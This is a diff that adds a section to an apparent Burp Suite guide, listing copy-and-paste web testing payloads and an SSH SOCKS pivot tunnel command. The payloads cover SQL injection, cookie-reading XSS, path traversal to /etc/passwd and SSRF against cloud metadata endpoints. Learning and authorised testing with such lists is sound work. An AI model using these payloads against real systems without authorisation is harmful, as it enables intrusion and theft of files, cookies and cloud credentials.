@@ -285,6 +285,53 @@ In Burp:
 | **7. Comparer** | Compare two requests/responses side‑by‑side (useful for diffing). | Comparer tab |
 | **8. Logger** | Persistent logging of all traffic (file output). | Logger tab → Options → “Write log to file” |
 
+### 9.1 Essential Web Testing Payload Lists (Copy-and-Paste for Intruder & Repeater)
+
+#### 1. SQL Injection (SQLi) Detection Payloads
+```text
+' OR '1'='1
+' OR 1=1 --
+' UNION SELECT NULL, NULL, NULL--
+admin'--
+1' AND SLEEP(5)#
+```
+
+#### 2. Cross-Site Scripting (XSS) Polyglot Payloads
+```html
+<script>alert(document.domain)</script>
+"><img src=x onerror=alert(document.cookie)>
+"><svg/onload=alert(1)>
+javascript:alert(1)
+```
+
+#### 3. Path Traversal / Local File Inclusion (LFI) Payloads
+```text
+../../../../etc/passwd
+../../../../etc/hosts
+../../../../../../windows/win.ini
+..%252f..%252f..%252fetc%252fpasswd
+```
+
+#### 4. SSRF (Server-Side Request Forgery) Cloud Metadata Payloads
+```text
+http://169.254.169.254/latest/meta-data/ (AWS)
+http://169.254.169.254/computeMetadata/v1/ (GCP)
+http://168.63.129.16/metadata/instance (Azure)
+http://127.0.0.1:80
+http://localhost:22
+```
+
+### 9.2 Route Burp Suite Traffic Through an SSH SOCKS5 Tunnel
+If you need to proxy Burp through a remote server or internal pivot box:
+
+```bash
+# Create a local SOCKS5 proxy tunnel on port 1080 to remote server
+ssh -D 1080 -N -f user@remote-pivot-server.com
+
+# In Burp Suite: User options -> Connections -> SOCKS Proxy ->
+# Check "Use SOCKS proxy", set Host: 127.0.0.1 and Port: 1080
+```
+
 ---  
 
 <a name="troubleshooting"></a>
